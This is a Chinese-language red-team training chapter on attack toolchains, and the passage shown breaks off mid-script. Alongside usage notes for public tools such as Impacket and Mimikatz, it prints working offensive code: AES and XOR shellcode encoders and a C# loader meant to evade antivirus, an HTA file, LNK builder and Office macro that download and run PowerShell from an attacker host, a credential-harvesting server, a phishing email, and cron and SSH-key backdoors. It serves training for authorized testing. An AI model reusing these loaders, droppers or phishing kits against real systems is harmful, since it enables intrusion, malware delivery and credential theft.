# 第73章 红队工具链与武器化

> **难度等级**：🟠 高等
>
> **预计学习时间**：6 小时
>
> **前置知识**：
> - 熟悉 Linux/Windows 命令行操作
> - 掌握网络基础（TCP/IP、HTTP、DNS）
> - 了解常见漏洞原理（SQL 注入、反序列化、溢出等）
> - 熟悉至少一门编程语言（Python/Go/C#）
> - 具备基本的渗透测试经验
>
> **学习目标**：
> - 理解红队工具链的整体架构与各阶段工具的协作关系
> - 掌握信息收集、漏洞利用、后渗透、免杀、钓鱼五大工具链的核心工具
> - 能够使用 Impacket 套件完成横向移动
> - 学会开发自定义免杀加载器与自研工具
> - 能够搭建并管理企业级红队武器库
> - 了解护网红队工具箱的配置与使用规范

---

## 73.1 红队工具链概述（侦察/攻击/后渗透/免杀/钓鱼）

> **核心类比：特种兵的"任务装备包"**
>
> 想象一个特种兵出任务前的装备清单。他不能只带枪——他需要侦察设备、通信设备、爆破工具、医疗包、伪装服...每个阶段需要不同的装备。
>
> 红队工具链也是一样的道理——攻击的每个阶段，都需要专用工具：
>
> | Kill Chain阶段 | 特种兵需要什么 | 红队工具链 |
> |---------------|-------------|-----------|
> | **侦察** | 望远镜、无人机、卫星图 | Amass, Subfinder, Nmap, Fofa |
> | **武器化** | 制造特定的破门炸药 | Cobalt Strike/生成Payload |
> | **投递** | 伪装成老百姓混进去 | Gophish钓鱼, Evilginx |
> | **利用** | 找到薄弱点破门 | Metasploit, SQLMap |
> | **安装** | 在据点安装监控/后门 | 持久化后门、计划任务 |
> | **C2** | 对讲机/卫星电话 | Cobalt Strike, Sliver |
> | **横向移动** | 从一楼打到顶楼 | Impacket, CrackMapExec |
> | **目标达成** | 拿走情报/摧毁目标 | Mimikatz, 数据外传 |

### 工具链的"接力棒"模式

**每一个阶段的输出，都是下一个阶段的输入：**

```
侦察 → 资产清单 → 漏洞扫描 → 漏洞列表 → 利用 → 获取Shell
→ 后渗透(提权/横向) → 域控 → 目标达成
```

> **最重要的理念**：红队工具不是越新越炫酷越好。**稳定性第一、隐蔽性第二、功能第三。**
> 行动可能持续数周甚至数月，一个工具崩溃可能导致整个会话丢失。

红队（Red Team）评估不同于传统渗透测试，它更强调**全流程的攻击链闭环**与**真实对手模拟**。一个成熟的红队工具链通常按照攻击杀伤链（Cyber Kill Chain）的阶段划分，每一阶段都配备对应的工具集，形成"侦察 → 武器化 → 投递 → 利用 → 安装 → 命令控制 → 横向移动 → 目标达成"的完整闭环。

### 73.1.1 红队工具链的阶段划分

| 阶段 | 中文 | 核心目标 | 代表工具 |
|------|------|---------|---------|
| Reconnaissance | 侦察 | 资产发现、情报收集 | Amass、Subfinder、Nmap |
| Weaponization | 武器化 | 制作载荷、绑定后门 | Cobalt Strike、Metasploit |
| Delivery | 投递 | 钓鱼、水坑、社工 | Gophish、EvilGinx |
| Exploitation | 利用 | 漏洞利用获取执行 | Metasploit、SQLMap |
| Installation | 安装 | 植入持久化后门 | SharPersist、Persistence |
| C2 | 命令控制 | 远控通道 | Sliver、Havoc、Cobalt Strike |
| Lateral Movement | 横向移动 | 内网穿透、凭据传递 | Impacket、CrackMapExec |
| Actions on Objectives | 目标达成 | 数据外传、破坏 | Mimikatz、ExfilFilter |

### 73.1.2 工具链的协作关系

红队工具链不是孤立存在的，而是通过**数据流转**串联起来。例如：

```
信息收集工具(Amass) → 资产清单 → 扫描工具(Nuclei) → 漏洞清单
→ 利用工具(Metasploit) → 会话 → C2框架(Cobalt Strike)
→ 横向工具(Impacket) → 域控 → 数据外传
```

每一段工具的输出都是下一段的输入，因此工具链的**数据格式标准化**与**自动化衔接**是武器化的关键。

### 73.1.3 工具链选型原则

1. **稳定性优先**：红队行动周期长（数周至数月），工具必须稳定不崩溃。
2. **隐蔽性兼顾**：避免使用已被 EDR 重点监控的工具特征。
3. **可定制化**：支持二次开发与特征修改。
4. **社区活跃度**：及时跟进 0day 与新攻击手法。
5. **合规性**：仅在授权范围内使用。

> **"武器化"的通俗理解——别拿菜刀上战场**
> 
> 工具链选型就像特种兵选装备：
> - ❌ 超市买把菜刀 → 公网直接下载Mimikatz.exe → 秒被杀软拦截
> - ✅ 定制军刺 → 自己编译、加混淆、改特征 → 杀软不认识
> 
> **武器化的本质**：对你熟悉的开源工具进行"私有化改造"——改变它的外形（免杀）、改变它的行为（绕过行为检测）、改变它的通信方式（流量隐匿）。让它从"大家都认识的菜刀"变成"独一无二的军刺"。

> ⚠️ **注意**：本章涉及的所有工具仅用于授权红队评估与安全研究，未经授权使用属违法行为。

---

## 73.2 信息收集工具链（自动化情报收集）

信息收集是红队行动的基石，决定了后续攻击的广度与深度。现代红队倾向于构建**自动化的 OSINT（开源情报）流水线**，将多源数据汇聚成统一情报库。

### 73.2.1 子域名收集工具组合

子域名是突破边界最常见的入口。常用工具组合如下：

**Subfinder** —— 被动枚举（不触发目标告警）：

```bash
# 安装
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# 基础用法
subfinder -d target.com -o subs.txt

# 使用多个 API 源（Shodan、SecurityTrails、Censys）
subfinder -d target.com -all -o subs_all.txt

# 管道式组合 httpx 验证存活
subfinder -d target.com -silent | httpx -silent -title -tech-detect -status-code
```

**Amass** —— 主动+被动枚举（情报最全）：

```bash
# 安装
go install -v github.com/owasp-amass/amass/v4/...@master

# 被动模式（仅查询数据源）
amass enum -passive -d target.com -o amass_passive.txt

# 主动模式（含解析、端口扫描）
amass enum -active -d target.com -brute -o amass_active.txt

# 情报库写入（用于长期追踪）
amass enum -d target.com -o amass.txt
amass db -list
amass viz -d3 -d target.com -o amass_d3.html
```

### 73.2.2 端口与服务扫描

**Nmap** —— 经典扫描器：

```bash
# 快速存活探测
nmap -sn 10.0.0.0/24 -oG hosts.txt

# SYN 半开扫描（需 root）
nmap -sS -sV -O -p- 10.0.0.5 -oA target_full

# Top 1000 端口 + 服务版本 + 脚本
nmap -sV -sC --top-ports 1000 10.0.0.5

# UDP 扫描
nmap -sU --top-ports 100 10.0.0.5
```

**Masscan + Nmap 组合**（高速扫描+精准识别）：

```bash
# Masscan 全端口高速扫描
masscan -p1-65535 10.0.0.0/24 --rate=10000 -oG masscan.txt

# 提取开放端口交给 Nmap 精扫
cat masscan.txt | grep "Status: Up" | awk '{print $2}' > live_hosts.txt
nmap -sV -sC -iL live_hosts.txt -oA detailed_scan
```

### 73.2.3 Web 指纹与漏洞扫描

**httpx** —— 批量 Web 存活与指纹：

```bash
cat subs.txt | httpx -title -tech-detect -status-code -follow-redirects -o web_alive.txt
```

**Nuclei** —— 模板化漏洞扫描：

```bash
# 安装
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# 全模板扫描
nuclei -l web_alive.txt -o nuclei_results.txt

# 指定模板（如 CVE、暴露面板）
nuclei -l web_alive.txt -t cves/ -t exposures/ -severity high,critical

# 自定义模板
nuclei -l web_alive.txt -t ~/my_templates/
```

### 73.2.4 OSINT 情报聚合

使用 **theHarvester** 聚合邮箱、子域名、员工信息：

```bash
theHarvester -d target.com -b all -f target_report.html
```

**GitHub 泄露监控** —— 使用 truffleHog 或 gitleaks：

```bash
# 安装
go install github.com/trufflesecurity/trufflehog/v3@latest

# 扫描 GitHub 仓库
trufflehog github --org=target_org --only-verified

# 扫描本地 git 历史
trufflehog git file://./repo
```

### 73.2.5 自动化情报流水线

将上述工具串联为一个流水线脚本：

```python
#!/usr/bin/env python3
# auto_recon.py —— 自动化情报收集流水线
import subprocess
import datetime
import os

TARGET_DOMAIN = "target.com"
WORK_DIR = f"recon_{TARGET_DOMAIN}_{datetime.date.today()}"
os.makedirs(WORK_DIR, exist_ok=True)

def run(cmd, output_file):
    print(f"[*] Running: {cmd}")
    with open(f"{WORK_DIR}/{output_file}", "w") as f:
        subprocess.run(cmd, shell=True, stdout=f, stderr=subprocess.DEVNULL)

# 1. 子域名收集
run(f"subfinder -d {TARGET_DOMAIN} -all -silent", "subdomains.txt")
run(f"amass enum -passive -d {TARGET_DOMAIN}", "amass_subs.txt")

# 2. 合并去重
run("cat subdomains.txt amass_subs.txt | sort -u", "all_subs.txt")
run(f"cp all_subs.txt {WORK_DIR}/all_subs.txt && cd {WORK_DIR} && cat all_subs.txt | httpx -silent -title -status-code -tech-detect", "web_alive.txt")

# 3. 漏洞扫描
run(f"cd {WORK_DIR} && nuclei -l web_alive.txt -severity high,critical", "nuclei.txt")

# 4. 端口扫描（针对存活主机）
run(f"cd {WORK_DIR} && cat web_alive.txt | awk '{{print $1}}' | sed 's|https\\?://||' > live_ips.txt", "live_ips.txt")

print(f"[+] 完成，结果保存在 {WORK_DIR}/")
```

运行：

```bash
python3 auto_recon.py
```

---

## 73.3 漏洞利用工具链（扫描/验证/利用）

漏洞利用工具链从发现到利用分为三步：**扫描发现 → 验证确认 → 利用获取权限**。

### 73.3.1 漏洞扫描工具

**Nessus / OpenVAS** —— 商业/开源漏洞扫描器：

```bash
# OpenVAS 启动
gvm-start

# 命令行扫描（OMP 协议）
omp -u admin -w password --xml="<create_target><name>Target</name><hosts>10.0.0.0/24</hosts></create_target>"
```

**Nuclei** —— 轻量级模板扫描（前文已介绍）。

### 73.3.2 漏洞验证工具

**Metasploit Framework** —— 漏洞利用瑞士军刀：

```bash
# 启动
msfconsole

# 搜索漏洞模块
msf> search eternalblue

# 使用模块
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> set RHOSTS 10.0.0.5
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.100
msf> exploit
```

**searchsploit** —— 离线 Exploit-DB 搜索：

```bash
searchsploit apache 2.4
searchsploit -m 12345   # 复制 exploit 到当前目录
searchsploit -x 12345   # 查看 exploit 内容
```

### 73.3.3 Web 漏洞利用工具

> **一键制导类比：SQL注入就像开锁技能**
>
> Web漏洞利用工具就像是锁匠的一整套开锁工具。从前渗透测试员要手动编写注入语句、逐字符猜测，现在工具可以自动化完成：
> - **SQLMap** = 自动万能钥匙：插进锁孔(注入点)，自动试所有钥匙型号直到开门
> - **Burp Suite** = 锁匠工作台：可以截获请求(看锁芯类型)、修改请求(定制钥匙)、重放请求(反复试)
> - **Nuclei** = 锁型扫描仪：快速扫过去，哪个锁是已知型号就标记出来

**SQLMap** —— 自动化 SQL 注入：

```bash
# 基础检测
sqlmap -u "http://target.com/page?id=1" --batch

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 获取表
sqlmap -u "http://target.com/page?id=1" -D users --tables

# dump 数据
sqlmap -u "http://target.com/page?id=1" -D users -T accounts --dump

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 使用 Burp 请求包
sqlmap -r burp_request.txt --level=5 --risk=3
```

**Burp Suite** —— Web 渗透核心平台：
- Intruder：暴力枚举、模糊测试
- Repeater：手工重放与调试
- Scanner（Pro）：自动化漏洞扫描
- 插件生态：Active Scan++、Autorize、Logger++

### 73.3.4 自定义 Exploit 模板

对于无公开 EXP 的漏洞，红队需自研 PoC。Python 模板示例：

```python
#!/usr/bin/env python3
# CVE-2024-XXXX 验证脚本
import requests
import argparse
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_vuln(url):
    """检测目标是否存在漏洞"""
    payload = "/api/v1/debug?cmd=ls"
    try:
        r = requests.get(url + payload, timeout=5, verify=False)
        if "root" in r.text or r.status_code == 200:
            return True, r.text
    except Exception as e:
        return False, str(e)
    return False, "Not vulnerable"

def exploit(url, cmd):
    """执行命令"""
    payload = f"/api/v1/debug?cmd={cmd}"
    r = requests.get(url + payload, timeout=5, verify=False)
    return r.text

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2024-XXXX PoC")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-c", "--cmd", default="id", help="Command to execute")
    args = parser.parse_args()

    vuln, info = check_vuln(args.url)
    if vuln:
        print(f"[+] 目标存在漏洞: {args.url}")
        print(f"[+] 执行命令: {args.cmd}")
        print(exploit(args.url, args.cmd))
    else:
        print(f"[-] 目标不存在漏洞: {info}")
        sys.exit(1)
```

### 73.3.5 利用工具链集成

将扫描→验证→利用串联：

```bash
#!/bin/bash
# vuln_pipeline.sh
TARGETS=$1
while read ip; do
    echo "[*] 扫描 $ip ..."
    nmap -sV --script vuln "$ip" -oN "scan_$ip.txt"
    # 提取 CVE
    grep -oP 'CVE-\d{4}-\d+' "scan_$ip.txt" | sort -u | while read cve; do
        echo "[*] 搜索 $cve 的 EXP ..."
        searchsploit "$cve"
    done
done < "$TARGETS"
```

---

## 73.4 后渗透工具链（代理/横向/提权/维持）

获取初始 foothold 后，进入后渗透阶段。该阶段目标是**扩大战果**：建立稳定代理、横向移动、提权、维持访问。

### 73.4.1 代理与隧道工具

**frp** —— 反向代理穿透：

服务端 `frps.ini`：

```ini
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = StrongPass123!
```

客户端 `frpc.ini`（部署在受害机上）：

```ini
[common]
server_addr = 10.0.0.100
server_port = 7000

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
plugin_user = redteam
plugin_passwd = P@ssw0rd
```

启动：

```bash
# 服务端
./frps -c frps.ini
# 客户端
./frpc -c frpc.ini
```

**Chisel** —— HTTP 隧道（适合严格出网限制环境）：

```bash
# 服务端（攻击机）
chisel server -p 8080 --reverse

# 客户端（受害机）
chisel client 10.0.0.100:8080 R:socks
```

**Stowaway** —— 多级代理（适合复杂内网）：

```bash
# 一级节点
./stowaway_admin -l 9999 -s password

# 二级节点（受害机）
./stowaway_agent -c 10.0.0.100:9999 -s password
```

### 73.4.2 提权工具

**LinPEAS** —— Linux 提权辅助：

```bash
# 直接执行
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 离线执行
./linpeas.sh -a all
```

**WinPEAS** —— Windows 提权辅助：

```powershell
# PowerShell 执行
. .\winpeas.ps1
Invoke-WinPEAS

# 或 exe 版本
winpeas.exe
```

**BeRoot / PrivescCheck**：

```powershell
# PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Report PrivescCheckReport
```

### 73.4.3 持久化工具

**SharPersist** —— Windows 持久化：

```bash
# 注册表持久化
SharPersist.exe -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "HKCU:Software\Microsoft\Windows\CurrentVersion\Run" -v "Test" -m add

# 计划任务
SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "UpdateTask" -m add
```

**Linux 持久化技巧**：

```bash
# 1. SSH 公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 2. Cron 后门
(crontab -l; echo "*/5 * * * * /tmp/.backdoor") | crontab -

# 3. PAM 后门（高级）
# 备份 pam_unix.so，注入万能密码
```

### 73.4.4 凭据收集

**Mimikatz** —— Windows 凭据抓取：

```powershell
mimikatz.exe
# 抓取明文密码
sekurlsa::logonpasswords
# 抓取 NTLM
sekurlsa::msv
# 导出 lsass
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
# DCSync
lsadump::dcsync /domain:target.com /user:administrator
```

**LaZagne** —— 应用密码抓取：

```bash
# Linux
python3 lazagne.py all

# Windows
lazagne.exe all
```

---

## 73.5 横向移动工具链（Impacket 套件等）

横向移动是红队从单点突破走向域控沦陷的关键环节。**Impacket** 是 SecureAuth 维护的 Python 网络协议库，是内网横向的核心工具集。

### 73.5.1 Impacket 套件核心工具

| 工具 | 用途 |
|------|------|
| psexec.py | 类 PsExec 远程执行 |
| wmiexec.py | WMI 远程执行（无文件落地） |
| smbexec.py | SMB 远程执行 |
| atexec.py | 计划任务执行 |
| secretsdump.py | 凭据转储（本地/NTDS） |
| GetUserSPNs.py | Kerberoasting 攻击 |
| GetNPUsers.py | AS-REP Roasting |
| ticketer.py | 黄金/白银票据生成 |
| ntfsrelay.py | NTLM Relay |

### 73.5.2 远程执行示例

**psexec.py** —— 获取交互式 shell：

```bash
# 使用明文密码
python3 psexec.py target.com/administrator:Password123@10.0.0.5

# 使用 Hash
python3 psexec.py -hashes :NTLM_HASH target.com/administrator@10.0.0.5

# 使用域凭据
python3 psexec.py target.com/administrator:Password123@10.0.0.5 cmd.exe
```

**wmiexec.py** —— 隐蔽执行（推荐）：

```bash
python3 wmiexec.py target.com/administrator:Password123@10.0.0.5
# 优点：不落地二进制，仅通过 WMI 执行命令，痕迹较少
```

**atexec.py** —— 计划任务执行：

```bash
python3 atexec.py target.com/administrator:Password123@10.0.0.5 "whoami"
```

### 73.5.3 凭据转储

**secretsdump.py** —— 本地/远程 SAM 与 NTDS 转储：

```bash
# 本地 SAM 转储
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL

# 远程 NTDS 转储（需域管）
python3 secretsdump.py target.com/administrator:Password123@10.0.0.5

# DCSync 方式（仅凭据，不落地）
python3 secretsdump.py -just-dc target.com/administrator:Password123@10.0.0.5

# 仅提取 NTLM
python3 secretsdump.py -just-dc-ntlm target.com/administrator:Password123@10.0.0.5
```

### 73.5.4 Kerberos 攻击

**GetUserSPNs.py** —— Kerberoasting：

```bash
# 获取所有 SPN 用户
python3 GetUserSPNs.py target.com/user:pass -request

# 仅请求 TGS
python3 GetUserSPNs.py target.com/user:pass -request-user MSSQLSvc

# 离线破解
hashcat -m 13100 hashes.txt rockyou.txt
```

**GetNPUsers.py** —— AS-REP Roasting：

```bash
# 获取不要求预认证的用户
python3 GetNPUsers.py target.com/ -no-pass -usersfile users.txt

# 已知凭据
python3 GetNPUsers.py target.com/user:pass -request

# 破解
hashcat -m 18200 hashes.txt rockyou.txt
```

### 73.5.5 黄金/白银票据

**ticketer.py** —— 生成票据：

```bash
# 黄金票据（需 krbtgt hash）
python3 ticketer.py -domain target.com -domain-sid S-1-5-21-... -nthash KRBTGT_HASH Administrator

# 白银票据（需服务账户 hash）
python3 ticketer.py -spn MSSQLSvc/dc.target.com -domain target.com -nthash SERVICE_HASH Administrator

# 设置环境变量并访问
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass target.com/Administrator@dc.target.com
```

### 73.5.6 CrackMapExec（现 NetExec）

**CrackMapExec / NetExec** —— 内网批量扫描利器：

```bash
# 安装
pipx install crackmapexec
# 或新版
pipx install netexec

# SMB 批量存活与凭据验证
nxc smb 10.0.0.0/24 -u administrator -H NTLM_HASH

# 批量执行命令
nxc smb 10.0.0.0/24 -u administrator -H NTLM_HASH -x "whoami"

# Mimikatz 批量执行
nxc smb 10.0.0.0/24 -u administrator -H NTLM_HASH -M mimikatz

# 枚举域信息
nxc smb 10.0.0.5 -u administrator -H NTLM_HASH --shares
nxc smb 10.0.0.5 -u administrator -H NTLM_HASH --users
nxc smb 10.0.0.5 -u administrator -H NTLM_HASH --pass-pol
```

---

## 73.6 免杀工具链（加密/混淆/加载器）

随着 EDR 的普及，传统载荷极易被查杀。免杀技术是红队绕过终端防护的核心能力。

### 73.6.1 免杀技术分类

1. **静态免杀**：修改特征码、加密载荷、分离加载
2. **动态免杀**：API 调用混淆、直接系统调用、内存执行
3. **行为免杀**：规避沙箱、延迟执行、进程注入伪装

### 73.6.2 Shellcode 加密与混淆

**XOR 加密 Python 示例**：

```python
#!/usr/bin/env python3
# xor_encoder.py —— XOR 加密 shellcode
import sys

def xor_encrypt(data, key):
    return bytes([b ^ key for b in data])

def main():
    # 原始 shellcode（msfvenom 生成）
    shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51..."
    key = 0x55  # 单字节密钥
    
    encrypted = xor_encrypt(shellcode, key)
    
    # 输出 C 格式
    print("unsigned char buf[] = {")
    for i in range(0, len(encrypted), 16):
        chunk = encrypted[i:i+16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        print(f"  {hex_str},")
    print("};")
    print(f"// Key: 0x{key:02x}")
    print(f"// Length: {len(encrypted)}")

if __name__ == "__main__":
    main()
```

**AES 加密版本**：

```python
#!/usr/bin/env python3
# aes_encoder.py —— AES 加密 shellcode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import os

def aes_encrypt(shellcode, key):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
    return iv, encrypted

key = os.urandom(32)  # AES-256
shellcode = b"\xfc\x48\x83\xe4..."
iv, enc = aes_encrypt(shellcode, key)

print(f"Key (base64): {base64.b64encode(key).decode()}")
print(f"IV (base64): {base64.b64encode(iv).decode()}")
print(f"Encrypted (base64): {base64.b64encode(enc).decode()}")
```

### 73.6.3 加载器开发

**C# 加载器**（适合 Windows 环境）：

```csharp
// Loader.cs —— AES 解密并执行 shellcode
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

class Loader
{
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    static void Main(string[] args)
    {
        if (args.Length < 3)
        {
            Console.WriteLine("Usage: Loader.exe <key_b64> <iv_b64> <payload_b64>");
            return;
        }

        byte[] key = Convert.FromBase64String(args[0]);
        byte[] iv = Convert.FromBase64String(args[1]);
        byte[] enc = Convert.FromBase64String(args[2]);

        // AES 解密
        using (Aes aes = Aes.Create())
        {
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            using (ICryptoTransform decryptor = aes.CreateDecryptor())
            using (MemoryStream ms = new MemoryStream(enc))
            using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
            {
                byte[] shellcode = new byte[enc.Length];
                int read = cs.Read(shellcode, 0, shellcode.Length);
                Array.Resize(ref shellcode, read);

                // 分配可执行内存
                IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                Marshal.Copy(shellcode, 0, addr, shellcode.Length);

                // 创建线程执行
                uint threadId;
                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
        }
    }
}
```

编译：

```bash
# Linux 下使用 mono 或 dotnet
dotnet new console -o Loader
# 替换 Program.cs 后
dotnet build -c Release
```

### 73.6.4 直接系统调用（Direct Syscalls）

绕过 EDR 的 API Hook，直接调用 ntdll 系统调用号：

```c
// syscall_example.c —— 直接系统调用示例（NtAllocateVirtualMemory）
#include <windows.h>
#include <stdio.h>

// 系统调用号因 Windows 版本不同（需动态获取）
// 这里以 Win10 1903 NtAllocateVirtualMemory = 0x18 为例
#pragma endregion

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;
    NTSTATUS status = NtAllocateVirtualMemory(
        (HANDLE)-1, &baseAddr, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    printf("Allocated at: %p, status: 0x%lx\n", baseAddr, status);
    return 0;
}
```

> 💡 **提示**：实际免杀中，建议使用 **SysWhispers3**、**HellsGate** 等成熟项目动态解析 SSN。

### 73.6.5 流行免杀工具

| 工具 | 类型 | 特点 |
|------|------|------|
| **Shellter** | 注入器 | 将 shellcode 注入合法 PE |
| **Donut** | .NET 注入 | 将 .NET 程序集转为 shellcode |
| **ScareCrow** | 框架 | 多种免杀技术集成 |
| **Veil** | 框架 | 多语言载荷生成 |
| **AVET** | 框架 | C 语言免杀框架 |
| **SysWhispers3** | 系统调用 | 直接系统调用生成 |

**Donut 示例**：

```bash
# 将 .NET exe 转为 shellcode
donut.exe -f payload.exe -o shellcode.bin

# 配合加载器执行
Loader.exe <key> <iv> <base64(shellcode.bin)>
```

---

## 73.7 钓鱼工具链（邮件/网站/数据）

钓鱼是红队获取初始访问最常用的方式之一，尤其在边界防护严密时。

### 73.7.1 邮件钓鱼工具

**Gophish** —— 开源邮件钓鱼平台：

```bash
# 安装
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
chmod +x gophish
./gophish

# 访问 https://127.0.0.1:3333 （初始密码在日志中）
```

配置流程：
1. **Sending Profiles**：配置 SMTP 发件服务器
2. **Templates**：设计钓鱼邮件模板（含跟踪像素）
3. **Landing Pages**：设计仿冒登录页
4. **Users & Groups**：导入目标用户列表
5. **Campaigns**：发起钓鱼活动

**邮件模板示例**（HTML）：

```html
<html>
<body>
<p>尊敬的同事：</p>
<p>IT 部门检测到您的账户存在异常登录，请尽快通过以下链接验证身份：</p>
<p><a href="{{.URL}}">点击验证账户</a></p>
<p>如非本人操作，请立即联系 IT 安全团队。</p>
<p>—— IT 安全部门</p>
<img src="{{.TrackingURL}}" width="1" height="1" />
</body>
</html>
```

### 73.7.2 钓鱼网站

**EvilGinx** —— 中间人钓鱼（绕过 MFA）：

```bash
# 安装
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make build

# 配置
./evilginx
: config domain target.com
: config ip 10.0.0.100
: phishlets enable outlook
: lures create outlook
: lures get-url 0
```

**Modlishka** —— 类似的反向代理钓鱼工具。

### 73.7.3 载荷投递

**HTA 文件**：

```html
<!-- payload.hta -->
<html>
<head>
<script language="VBScript">
Function RunPayload()
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/payload.ps1')"
End Function
RunPayload()
</script>
</head>
<body>
正在加载，请稍候...
</body>
</html>
```

**LNK 文件生成**（Python）：

```python
#!/usr/bin/env python3
# make_lnk.py —— 生成恶意 LNK
import struct

def create_lnk(target_path, icon_path, arguments, output_path):
    # 简化版 LNK 生成（实际可用 pylnk 库）
    # 这里展示核心思路
    header = b'\x4c\x00\x00\x00'  # CLSID
    # ... 完整 LNK 结构较复杂，建议使用 pylnk3 库
    pass

# 推荐使用 pylnk3
# pip install pylnk3
import pylnk3
pylnk3.Lnk(
    path="C:\\Windows\\System32\\cmd.exe",
    arguments="/c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/p.ps1')",
    icon=r"C:\Windows\System32\shell32.dll,15"
).save("财务报表.lnk")
```

**Office 宏（VBA）**：

```vba
' ThisDocument 模块
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.100/p.ps1')", 0
End Sub
```

### 73.7.4 数据回传与收集

钓鱼成功后，收集的凭据需要安全回传。常用方式：

```python
#!/usr/bin/env python3
# collect_server.py —— 简单凭据收集服务器
from flask import Flask, request, jsonify
import datetime
import json

app = Flask(__name__)
LOG_FILE = "credentials.log"

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    data['timestamp'] = str(datetime.datetime.now())
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent')
    
    with open(LOG_FILE, 'a') as f:
        f.write(json.dumps(data, ensure_ascii=False) + '\n')
    
    print(f"[+] 收到凭据: {data}")
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

---

## 73.8 自动化武器平台（自动化渗透框架）

自动化渗透框架能够将工具链编排为流水线，显著提升红队效率。

### 73.8.1 主流自动化框架

| 框架 | 特点 | 适用场景 |
|------|------|---------|
| **Metasploit** | 老牌、模块丰富 | 漏洞利用 |
| **Cobalt Strike** | 商业、C2 强大 | 企业级红队 |
| **Sliver** | 开源 C2、Go 实现 | 替代 CS |
| **Havoc** | 开源 C2、现代化 | 新兴红队 |
| **Caldera** | MITRE 出品、自动化 | 自动化攻击模拟 |
| **Infection Monkey** | 内网横向自动化 | 横向测试 |
| **AutoRecon** | 信息收集自动化 | 侦察阶段 |

### 73.8.2 Sliver C2 使用

```bash
# 安装
curl https://sliver.sh/install | sudo bash

# 启动服务端
sliver-server

# 生成 implant
sliver > generate --http http://10.0.0.100:80 --os windows

# 监听
sliver > http
sliver > sessions

# 操作会话
sliver > use <session_id>
sliver > shell
sliver > exec whoami
```

### 73.8.3 Caldera 自动化攻击

```bash
# 安装
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
pip install -r requirements.txt
python3 server.py --insecure

# 访问 https://localhost:8888
# 默认账号: admin / admin
```

Caldera 通过 **Ability（能力）** 与 **Adversary（对手）** 编排自动化攻击链：

```yaml
# ability 示例
- id: 1234567890
  name: Mimikatz credentials dump
  description: Dump credentials using mimikatz
  tactic: credential-access
  technique:
    attack_id: T1003
    name: OS Credential Dumping
  executors:
    - name: psh
      command: |
        Invoke-Mimikatz -DumpCreds
      timeout: 60
```

### 73.8.4 自定义自动化编排

使用 Python 编写编排器，串联多个工具：

```python
#!/usr/bin/env python3
# orchestrator.py —— 红队自动化编排框架
import subprocess
import json
import time
from pathlib import Path

class RedTeamOrchestrator:
    def __init__(self, target, workdir="ops"):
        self.target = target
        self.workdir = Path(workdir)
        self.workdir.mkdir(exist_ok=True)
        self.results = {}

    def run_step(self, name, cmd):
        print(f"\n[+] 执行阶段: {name}")
        print(f"    命令: {cmd}")
        start = time.time()
        result = subprocess.run(
